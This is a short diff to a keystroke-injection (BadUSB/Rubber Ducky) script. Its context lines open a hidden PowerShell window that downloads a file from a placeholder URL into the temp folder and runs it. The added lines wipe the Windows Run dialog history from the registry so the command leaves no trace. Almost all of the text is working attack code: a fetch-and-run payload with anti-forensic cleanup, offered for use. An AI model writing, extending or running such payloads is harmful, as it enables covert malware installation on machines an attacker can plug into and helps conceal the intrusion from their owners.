@@ -70,3 +70,11 @@ GUI R
 DELAY 200
 STRING powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('<http://URL/TO/FILE.EXT>', '%TEMP%\<OUTPUT_FILE.EXT>'); Start-Process "%TEMP%\<OUTPUT_FILE.EXT>"
 ENTER
+REM
+REM CLEAR THE RUN HISTORY
+REM
+DELAY 200
+GUI R
+DELAY 200
+STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+ENTER
